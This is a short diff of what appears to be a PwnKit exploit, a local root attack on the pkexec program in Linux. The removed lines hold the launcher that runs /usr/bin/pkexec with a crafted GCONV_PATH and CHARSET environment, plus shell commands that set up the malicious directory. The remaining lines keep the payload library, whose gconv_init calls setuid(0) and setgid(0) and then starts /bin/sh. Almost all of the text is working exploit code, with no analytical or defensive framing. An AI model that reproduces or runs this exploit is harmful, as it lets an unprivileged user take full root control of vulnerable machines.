@@ -1,22 +1,12 @@
-#include <unistd.h>
-int main(int argc, char **argv) {
-    char *const args[] = { NULL };
-    char *const env[] = { "pwn.so", "PATH=GCONV_PATH=.", "CHARSET=PWN", "SHELL=pwn", NULL };
-    execve("/usr/bin/pkexec", args, env);
-    return 0;
-}
-
+cat << 'EOF' > pwn_so.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+
 void gconv() {}
 void gconv_init() {
     setuid(0); setgid(0);
     setenv("PATH", ".", 1);
     execl("/bin/sh", "sh", NULL);
 }
-
-mkdir -p 'GCONV_PATH=.'
-touch 'GCONV_PATH=./pwn.so'
-chmod +x 'GCONV_PATH=./pwn.so'
-
+EOF
